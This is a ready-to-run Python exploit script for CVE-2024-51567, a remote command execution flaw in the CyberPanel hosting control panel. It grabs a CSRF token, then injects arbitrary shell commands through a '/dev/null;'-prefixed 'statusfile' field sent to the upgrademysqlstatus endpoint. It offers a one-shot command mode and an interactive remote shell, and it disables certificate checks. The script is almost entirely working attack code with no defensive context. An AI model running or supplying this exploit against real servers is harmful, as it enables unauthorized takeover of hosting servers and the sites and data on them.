#CyberPanel CVE-2024-51567 RCE exp
#Usage: python CVE-2024-51567.py -t http://127.0.0.1:8090 -c whoami
#Usage: python CVE-2024-51567.py -t https://127.0.0.1:8090 -s
import argparse,requests,json,warnings

def send_command(url,command,csrf):
    headers = {
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0' ,
        'X-CSRFToken' : csrf ,
        'Content-Type' : 'application/json' ,
        'Referer' : url + '/dataBases'
    }
    payload = {
        "statusfile" : "/dev/null;" + command ,
        "csrftoken" : csrf
    }
    try:
        resp = session.put( url , headers=headers , json=payload , verify=False )
        data = json.loads( resp.text )
        return data[ 'requestStatus' ].strip()
    except:
        return "connection error"

def exp(target,command):
    url=target
    try:
        resp=session.get(url,verify=False)
        csrf=resp.cookies['csrftoken']
        headers = {
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0' ,
            'X-CSRFToken' : csrf ,
            'Content-Type' : 'application/json' ,
            'Referer' : url + '/dataBases'
        }
        payload = {
            "statusfile" : "/dev/null;" + command ,
            "csrftoken" : csrf
        }
        payload_url = url + '/dataBases/upgrademysqlstatus'
        resp = session.put( payload_url , headers=headers , json=payload , verify=False )
        data = json.loads( resp.text )
        print( data[ 'requestStatus' ].strip() )
    except:
        print("[-] Connection Timeout")

def shell(url):
    resp = session.get( url , verify=False )
    csrf = resp.cookies[ 'csrftoken' ]
    payload_url = url + '/dataBases/upgrademysqlstatus'
    while True:
        command = input( 'CyberPanel>' )
        if command.lower()== 'exit':
            print("Exiting the shell")
            break
        else:
            result=send_command( payload_url, command, csrf )
            print( result )

if __name__ == '__main__':
    warnings.filterwarnings("ignore")
    parser = argparse.ArgumentParser(usage="python CVE-2024-51567.py -t http://127.0.0.1:8090 -c whoami\npython CVE-2024-51567.py -t https://127.0.0.1:8090 -s",description="CyberPanel CVE-2024-51567 RCE exp")
    parser.add_argument('-t', '--target', help='Target URL', required=True)
    parser.add_argument('-c','--command', help='Command to execute', required=False)
    parser.add_argument('-s', '--shell', help='Shell to execute',action='store_true')
    args=parser.parse_args()
    target=args.target
    command=args.command
    session = requests.Session()
    if command!=None:
        exp(target,command)
    elif shell!=None:
        shell(target)
    session.close()

